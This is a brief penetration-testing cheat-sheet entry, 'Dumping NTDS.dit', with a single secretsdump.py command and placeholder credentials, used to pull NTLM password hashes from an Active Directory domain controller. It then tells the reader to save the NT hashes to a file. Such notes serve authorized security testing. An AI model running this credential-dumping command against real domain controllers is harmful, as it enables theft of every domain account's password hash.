# Dumping NTDS.dit

use scretsdump against DC

```
secretsdump.py <domain>.local/<user>:'<passwd>'@ip -just-dc-ntlm
```

Dumps NTDS

save the dumps NT part of hash into a text file

